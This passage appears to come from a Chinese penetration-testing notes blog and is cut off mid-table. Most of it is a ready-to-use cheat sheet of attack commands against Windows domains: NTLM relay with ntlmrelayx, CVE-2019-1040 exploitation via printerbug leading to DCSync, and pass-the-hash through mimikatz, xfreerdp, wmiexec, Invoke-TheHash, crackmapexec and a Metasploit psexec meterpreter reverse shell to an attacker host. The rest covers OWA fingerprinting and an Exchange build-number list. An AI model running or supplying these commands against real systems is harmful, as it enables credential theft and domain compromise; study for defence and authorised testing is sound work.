<p>在开启了中间人后，就可以同时开启ntlm中继，原理是在攻击机上使用ntlmrelayex监听445，从而对smb请求进行修改和重发。中继只能对关闭了smb签名的主机进行中继。</p>
<p>找到关闭了SMB签名的主机，把IP写入targets.txt：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py2 RunFinger.py -i 192.168.19.0/24</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;<span class="number">192.168</span><span class="number">.19</span><span class="number">.8</span>&#x27;, Os:&#x27;Windows Server <span class="number">2008</span> R2 Enterprise <span class="number">7601</span> Service Pack <span class="number">1</span>&#x27;, Domain:&#x27;TT&#x27;, Signing:&#x27;True&#x27;, Time:&#x27;<span class="number">2020</span><span class="number">-09</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">48</span>:<span class="number">19</span>&#x27;]</span><br><span class="line">[&#x27;<span class="number">192.168</span><span class="number">.19</span><span class="number">.129</span>&#x27;, Os:&#x27;Windows <span class="number">7</span> Ultimate <span class="number">7601</span> Service Pack <span class="number">1</span>&#x27;, Domain:&#x27;TT&#x27;, Signing:&#x27;False&#x27;, Time:&#x27;<span class="number">2020</span><span class="number">-09</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">48</span>:<span class="number">19</span>&#x27;]</span><br><span class="line">[&#x27;<span class="number">192.168</span><span class="number">.19</span><span class="number">.136</span>&#x27;, Os:&#x27;Windows Server <span class="number">2012</span> R2 Standard <span class="number">9600</span>&#x27;, Domain:&#x27;WORKGROUP&#x27;, Signing:&#x27;False&#x27;, Time:&#x27;<span class="number">2020</span><span class="number">-09</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">48</span>:<span class="number">19</span>&#x27;]</span><br></pre></td></tr></table></figure>

<p>ntlmrelay中继，windows上只能使用python版，ntlmrelayx.py是impacket包（建议使用python3.6）中自带的。</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意，使用-c执行命令时，不会同时导出hash。</span><br><span class="line">ntlmrelayx的http模块测试时有问题，不能导出hash。可以使用--no-http-server参数关闭http模块，并将responder配置文件中的HTTP模块打开，还是使用responder的HTTP模块获取NTLM hash。</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -tf targets.txt -smb2support</span><br><span class="line">ntlmrelayx.py -tf targets.txt -smb2support -c calc</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20200907165616841.png" alt="image-20200907165616841"></p>
<h3 id="CVE-2019-1040-1"><a href="#CVE-2019-1040-1" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><ul>
<li><p><strong>效果</strong></p>
<p>NTLM中间人是被动触发，等待通段下主机访问其他主机时进行劫持。而这个漏洞可以让域控主动请求我们。</p>
<p>普通域用户提升为管理员。</p>
<p>安装impacket包</p>
</li>
<li><p><strong>条件</strong></p>
<p>普通域用户账号密码</p>
<p>exchange服务</p>
</li>
<li><p><strong>操作</strong></p>
</li>
</ul>
<p>中继</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py --remove-mic --escalate-user ddh -t ldap:&#x2F;&#x2F;WIN-J341S97EGGH.tt.com -smb2support -debug</span><br></pre></td></tr></table></figure>

<p>触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py tt.com&#x2F;ddh@WIN-J341S97EGGH.tt.com 192.168.19.8</span><br></pre></td></tr></table></figure>

<p>DCSync</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py tt.com&#x2F;ddh@WIN-J341S97EGGH.tt.com -just-dc</span><br></pre></td></tr></table></figure>



<h3 id="NTLM利用"><a href="#NTLM利用" class="headerlink" title="NTLM利用"></a>NTLM利用</h3><h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意<span class="built_in">hash</span>注入后使用whoami看到的还会是当前用户，需要通过 dir \\IP\c$ 去检查密码是否正确</span><br><span class="line">mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:172.16.1.8 /ntlm:5645ce11902f46d5ef222f94d99d7d1a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">限制条件</span><br><span class="line">需要服务器端开启了Restricted Admin mode模式，受限管理员模式 ，主要功能是使得凭据不会暴露在目标系统中，使用当前Windows登录凭据，不需要输入口令，直接登录即可。所以为PTH提供了可能</span><br><span class="line"></span><br><span class="line">适用系统</span><br><span class="line">Windows 8.1和Windows Server 2012 R2默认支持该功能</span><br><span class="line">Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</span><br><span class="line"></span><br><span class="line">开启RAM模式</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">使用RAM模式连接</span><br><span class="line">mstsc.exe &#x2F;restrictedadmin</span><br><span class="line"></span><br><span class="line">综上述，Server需要开启RAM模式，Client需要支持RAM</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:remoteserver &#x2F;ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br><span class="line">然后直接连接登录即可。</span><br><span class="line"></span><br><span class="line">或者使用kali下的xfreerdp进行连接</span><br><span class="line">xfreerdp &#x2F;u:administrator &#x2F;pth:d25ecd13fddbb542d2e16da4f9e0333d &#x2F;v:192.168.62.136 &#x2F;cert-ignore</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="PTH其他工具"><a href="#PTH其他工具" class="headerlink" title="PTH其他工具"></a>PTH其他工具</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">MSF:</span><br><span class="line">条件：①开启445端口SMB服务（默认开启）；②开启admin$共享</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set RHOSTS 192.168.1.178</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LPORT 4444</span><br><span class="line">set LHOST 192.168.1.144</span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBPASS d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1</span><br><span class="line">set SMBDomain WORKGROUP</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">Kali:</span><br><span class="line">kali存在以下pass the hash利用工具</span><br><span class="line"></span><br><span class="line">pth-curl</span><br><span class="line">pth-rpcclient</span><br><span class="line">pth-net</span><br><span class="line">pth-smbclient</span><br><span class="line">pth-smbget</span><br><span class="line">pth-sqsh</span><br><span class="line">pth-winexe</span><br><span class="line">pth-wmis</span><br><span class="line">pth-wmic</span><br><span class="line"></span><br><span class="line">pth-winexe -U Administrator%d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1 &#x2F;&#x2F;192.168.1.178 cmd</span><br><span class="line"></span><br><span class="line">Wmiexec:</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;wmiexec.py</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maaaaz&#x2F;impacket-examples-windows</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1 WORKSPACE&#x2F;Administrator@192.168.1.178 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">【注】py文件中提示需要Admin用户，经测试普通用户权限即可；</span><br><span class="line">hashes参数格式为LMHASH:NTHASH，由于高版本Windows系统默认不支持LMhash，所以LM可以设定为任意值；</span><br><span class="line">wmiexec.exe是通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</span><br><span class="line"></span><br><span class="line">Powershell:</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Invoke-TheHash&#x2F;</span><br><span class="line"></span><br><span class="line">Invoke-WMIExec:</span><br><span class="line">Invoke-WMIExec -Target 192.168.1.161 -Domain WORKGROUP -Username  Yoga -Hash AAD3B435B51404EEAAD3B435B51404EE:14CE14C36F1F350380B41C6F4D42BC06 -Command &quot;calc.exe&quot; -verbose</span><br><span class="line"></span><br><span class="line">Invoke-SMBExec:</span><br><span class="line">Invoke-SMBExec -Target 192.168.1.161 -Domain WORKGROUP -Username  Yoga -Hash AAD3B435B51404EEAAD3B435B51404EE:14CE14C36F1F350380B41C6F4D42BC06 -Command &quot;calc.exe&quot; -verbose</span><br><span class="line"></span><br><span class="line">Invoke-SMBClient:</span><br><span class="line">支持SMB1，SMB2，SMB signing 如果只有SMB文件共享的权限，没有远程执行权限，可以使用这个脚本。可以列举目录、上传文件、下载文件、删除文件（取决于该口令Hash的权限）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="crackmapexec爆破"><a href="#crackmapexec爆破" class="headerlink" title="crackmapexec爆破"></a>crackmapexec爆破</h4><p>最新编译（推荐使用Ubuntu版本）</p>
<p>windows上可以使用的exe版是很老的版本，这里下载的windows版不是exe的，需要使用python3 cme来运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r&#x2F;CrackMapExec&#x2F;actions</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec.exe --service-type smb -u jack -H 68F0D7B7EBD79E54F72C44FED3C74F89:30A96699356033B84283B8918A895D61 192.168.19.129</span><br></pre></td></tr></table></figure>



<h1 id="OWA"><a href="#OWA" class="headerlink" title="OWA"></a>OWA</h1><h3 id="版本查看"><a href="#版本查看" class="headerlink" title="版本查看"></a>版本查看</h3><p>首页查看源代码中包含版本号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;shortcut icon&quot; href&#x3D;&quot;&#x2F;owa&#x2F;auth&#x2F;15.0.1178&#x2F;themes&#x2F;resources&#x2F;favicon.ico&quot; type&#x3D;&quot;image&#x2F;x-icon&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;exchange&#x2F;new-features&#x2F;build-numbers-and-release-dates?view&#x3D;exchserver-2019</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">Exchange Server 2019 CU7 2020 年 9 月 15 日 15.2.721.2 15.02.0721.002</span><br><span class="line">Exchange Server 2019 CU6 2020 年 6 月 16 日 15.2.659.4 15.02.0659.004</span><br><span class="line">Exchange Server 2019 CU5 2020年3月17日 15.2.595.3 15.02.0595.003</span><br><span class="line">Exchange Server 2019 CU4 2019 年 12 月 17 日 15.2.529.5 15.02.0529.005</span><br><span class="line">Exchange Server 2019 CU3 2019 年 9 月 17 日 15.2.464.5 15.02.0464.005</span><br><span class="line">Exchange Server 2019 CU2 2019 年 6 月 18 日 15.2.397.3 15.02.0397.003</span><br><span class="line">Exchange Server 2019 CU1 2019 年 2 月 12 日 15.2.330.5 15.02.0330.005</span><br><span class="line">Exchange Server 2019 RTM 2018 年 10 月 22 日 15.2.221.12 15.02.0221.012</span><br><span class="line">Exchange Server 2019 Preview 2018 年 7 月 24 日 15.2.196.0 15.02.0196.000</span><br><span class="line">Exchange Server 2016 CU12 2019 年 2 月 12 日 15.1.1713.5 15.01.1713.005</span><br><span class="line">Exchange Server 2016 CU11 2018 年 10 月 16 日 15.1.1591.10 15.01.1591.010</span><br><span class="line">Exchange Server 2016 CU10 2018 年 6 月 19 日 15.1.1531.3 15.01.1531.003</span><br><span class="line">Exchange Server 2016 CU9 2018 年 3 月 20 日 15.1.1466.3 15.01.1466.003</span><br><span class="line">Exchange Server 2016 CU8 2017 年 12 月 19 日 15.1.1415.2 15.01.1415.002</span><br><span class="line">Exchange Server 2016 CU7 2017 年 9 月 19 日 15.1.1261.35 15.01.1261.035</span><br><span class="line">Exchange Server 2016 CU6 2017 年 6 月 27 日 15.1.1034.26 15.01.1034.026</span><br><span class="line">Exchange Server 2016 CU5 2017 年 3 月 21 日 15.1.845.34 15.01.0845.034</span><br><span class="line">Exchange Server 2016 CU4 2016 年 12 月 13 日 15.1.669.32 15.01.0669.032</span><br><span class="line">Exchange Server 2016 CU3 2016 年 9 月 20 日 15.1.544.27 15.01.0544.027</span><br><span class="line">Exchange Server 2016 CU2 2016 年 6 月 21 日 15.1.466.34 15.01.0466.034</span><br><span class="line">Exchange Server 2016 CU1 2016 年 3 月 15 日 15.1.396.30 15.01.0396.030</span><br><span class="line">Exchange Server 2016 RTM 2015 年 10 月 1 日 15.1.225.42 15.01.0225.042</span><br><span class="line">Exchange Server 2016 Preview 2015 年 7 月 22 日 15.1.225.16 15.01.0225.016</span><br><span class="line">Exchange Server 2013 CU22 2019 年 2 月 12 日 15.0.1473.3 15.00.1473.003</span><br><span class="line">Exchange Server 2013 CU21 2018 年 6 月 19 日 15.0.1395.4 15.00.1395.004</span><br><span class="line">Exchange Server 2013 CU20 2018 年 3 月 20 日 15.0.1367.3 15.00.1367.003</span><br><span class="line">Exchange Server 2013 CU19 2017 年 12 月 19 日 15.0.1365.1 15.00.1365.001</span><br><span class="line">Exchange Server 2013 CU18 2017 年 9 月 19 日 15.0.1347.2 15.00.1347.002</span><br><span class="line">Exchange Server 2013 CU17 2017 年 6 月 27 日 15.0.1320.4 15.00.1320.004</span><br><span class="line">Exchange Server 2013 CU16 2017 年 3 月 21 日 15.0.1293.2 15.00.1293.002</span><br><span class="line">Exchange Server 2013 CU15 2016 年 12 月 13 日 15.0.1263.5 15.00.1263.005</span><br><span class="line">Exchange Server 2013 CU14 2016 年 9 月 20 日 15.0.1236.3 15.00.1236.003</span><br><span class="line">Exchange Server 2013 CU13 2016 年 6 月 21 日 15.0.1210.3 15.00.1210.003</span><br><span class="line">Exchange Server 2013 CU12 2016 年 3 月 15 日 15.0.1178.4 15.00.1178.004</span><br><span class="line">Exchange Server 2013 CU11 2015 年 12 月 15 日 15.0.1156.6 15.00.1156.006</span><br><span class="line">Exchange Server 2013 CU10 2015 年 9 月 15 日 15.0.1130.7 15.00.1130.007</span><br><span class="line">Exchange Server 2013 CU9 2015 年 6 月 17 日 15.0.1104.5 15.00.1104.005</span><br><span class="line">Exchange Server 2013 CU8 2015 年 3 月 17 日 15.0.1076.9 15.00.1076.009</span><br><span class="line">Exchange Server 2013 CU7 2014 年 12 月 9 日 15.0.1044.25 15.00.1044.025</span><br><span class="line">Exchange Server 2013 CU6 2014 年 8 月 26 日 15.0.995.29 15.00.0995.029</span><br><span class="line">Exchange Server 2013 CU5 2014 年 5 月 27 日 15.0.913.22 15.00.0913.022</span><br><span class="line">Exchange Server 2013 SP1 2014 年 2 月 25 日 15.0.847.32 15.00.0847.032</span><br><span class="line">Exchange Server 2013 CU3 2013 年 11 月 25 日 15.0.775.38 15.00.0775.038</span><br><span class="line">Exchange Server 2013 CU2 2013 年 7 月 9 日 15.0.712.24 15.00.0712.024</span><br><span class="line">Exchange Server 2013 CU1 2013 年 4 月 2 日 15.0.620.29 15.00.0620.029</span><br><span class="line">Exchange Server 2013 RTM 2012 年 12 月 3 日 15.0.516.32 15.00.0516.032</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 26 2019 年 2 月 12 日 14.3.442.0 14.03.0442.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 25 2019 年 1 月 8 日 14.3.435.0 14.03.0435.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 24 2018 年 9 月 5 日 14.3.419.0 14.03.0419.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 23 2018 年 8 月 13 日 14.3.417.1 14.03.0417.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 22 2018 年 6 月 19 日 14.3.411.0 14.03.0411.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 21 2018 年 5 月 7 日 14.3.399.2 14.03.0399.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 20 2018 年 3 月 5 日 14.3.389.1 14.03.0389.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 19 2017 年 12 月 19 日 14.3.382.0 14.03.0382.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 18 2017 年 7 月 11 日 14.3.361.1 14.03.0361.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 17 2017 年 3 月 21 日 14.3.352.0 14.03.0352.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 16 2016 年 12 月 13 日 14.3.336.0 14.03.0336.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 15 2016 年 9 月 20 日 14.3.319.2 14.03.0319.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 14 2016 年 6 月 21 日 14.3.301.0 14.03.0301.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 13 2016 年 3 月 15 日 14.3.294.0 14.03.0294.000</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 12 2015 年 12 月 15 日 14.3.279.2 14.03.0279.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 11 2015 年 9 月 15 日 14.3.266.2 14.03.0266.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 10 2015 年 6 月 17 日 14.3.248.2 14.03.0248.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 9 2015 年 3 月 17 日 14.3.235.1 14.03.0235.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 8 v2 2014 年 12 月 12 日 14.3.224.2 14.03.0224.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 8 v1（已撤回） 2014 年 12 月 9 日 14.3.224.1 14.03.0224.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 7 2014 年 8 月 26 日 14.3.210.2 14.03.0210.002</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 6 2014 年 5 月 27 日 14.3.195.1 14.03.0195.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 5 2014 年 2 月 24 日 14.3.181.6 14.03.0181.006</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 4 2013 年 12 月 9 日 14.3.174.1 14.03.0174.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 3 2013 年 11 月 25 日 14.3.169.1 14.03.0169.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 2 2013 年 8 月 8 日 14.3.158.1 14.03.0158.001</span><br><span class="line">Exchange Server 2010 SP3 更新汇总 1 2013 年 5 月 29 日 14.3.146.0 14.03.0146.000</span><br><span class="line">Exchange Server 2010 SP3 2013 年 2 月 12 日 14.3.123.4 14.03.0123.004</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 8 2013 年 12 月 9 日 14.2.390.3 14.02.0390.003</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 7 2013 年 8 月 3 日 14.2.375.0 14.02.0375.000</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 6 2013 年 2 月 12 日 14.2.342.3 14.02.0342.003</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 5 v2 2012 年 12 月 10 日 14.2.328.10 14.02.0328.010</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 5 2012 年 11 月 13 日 14.3.328.5 14.03.0328.005</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 4 v2 2012 年 10 月 9 日 14.2.318.4 14.02.0318.004</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 4 2012 年 8 月 13 日 14.2.318.2 14.02.0318.002</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 3 2012 年 5 月 29 日 14.2.309.2 14.02.0309.002</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 2 2012 年 4 月 16 日 14.2.298.4 14.02.0298.004</span><br><span class="line">Exchange Server 2010 SP2 更新汇总 1 2012 年 2 月 13 日 14.2.283.3 14.02.0283.003</span><br><span class="line">Exchange Server 2010 SP2 2011 年 12 月 4 日 14.2.247.5 14.02.0247.005</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 8 2012 年 12 月 10 日 14.1.438.0 14.01.0438.000</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 7 v3 2012 年 11 月 13 日 14.1.421.3 14.01.0421.003</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 7 v2 2012 年 10 月 10 日 14.1.421.2 14.01.0421.002</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 7 2012 年 8 月 8 日 14.1.421.0 14.01.0421.000</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 6 2011 年 10 月 27 日 14.1.355.2 14.01.0355.002</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 5 2011 年 8 月 23 日 14.1.339.1 14.01.0339.001</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 4 2011 年 7 月 27 日 14.1.323.6 14.01.0323.006</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 3 2011 年 4 月 6 日 14.1.289.7 14.01.0289.007</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 2 2010 年 12 月 9 日 14.1.270.1 14.01.0270.001</span><br><span class="line">Exchange Server 2010 SP1 更新汇总 1 2010 年 10 月 4 日 14.1.255.2 14.01.0255.002</span><br><span class="line">Exchange Server 2010 SP1 2010 年 8 月 23 日 14.1.218.15 14.01.0218.015</span><br><span class="line">Exchange Server 2010 更新汇总 5 2010 年 12 月 13 日 14.0.726.0 14.00.0726.000</span><br><span class="line">Exchange Server 2010 更新汇总 4 2010 年 6 月 10 日 14.0.702.1 14.00.0702.001</span><br><span class="line">Exchange Server 2010 更新汇总 3 2010 年 4 月 13 日 14.0.694.0 14.00.0694.000</span><br><span class="line">Exchange Server 2010 更新汇总 2 2010 年 3 月 4 日 14.0.689.0 14.00.0689.000</span><br><span class="line">Exchange Server 2010 更新汇总 1 2009 年 12 月 9 日 14.0.682.1 14.00.0682.001</span><br><span class="line">Exchange Server 2010 RTM 2009 年 11 月 9 日 14.0.639.21 14.00.0639.021</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 23 2017 年 3 月 21 日 8.3.517.0 8.03.0517.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 22 2016 年 12 月 13 日 8.3.502.0 8.03.0502.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 21 2016 年 9 月 20 日 8.3.485.1 8.03.0485.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 20 2016 年 6 月 21 日 8.3.468.0 8.03.0468.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 19 2016 年 3 月 15 日 8.3.459.0 8.03.0459.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 18 2015 年 12 月 8.3.445.0 8.03.0445.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 17 2015 年 6 月 17 日 8.3.417.1 8.03.0417.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 16 2015 年 3 月 17 日 8.3.406.0 8.03.0406.000</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 15 2014 年 12 月 9 日 8.3.389.2 8.03.0389.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 14 2014 年 8 月 26 日 8.3.379.2 8.03.0379.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 13 2014 年 2 月 24 日 8.3.348.2 8.03.0348.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 12 2013 年 12 月 9 日 8.3.342.4 8.03.0342.004</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 11 2013 年 8 月 13 日 8.3.327.1 8.03.0327.001</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 10 2013 年 2 月 11 日 8.3.298.3 8.03.0298.003</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 9 2012 年 12 月 10 日 8.3.297.2 8.03.0297.002</span><br><span class="line">Exchange Server 2007 SP3 更新汇总 8-v3 2012 年 11 月 13 日 8.3.279.6 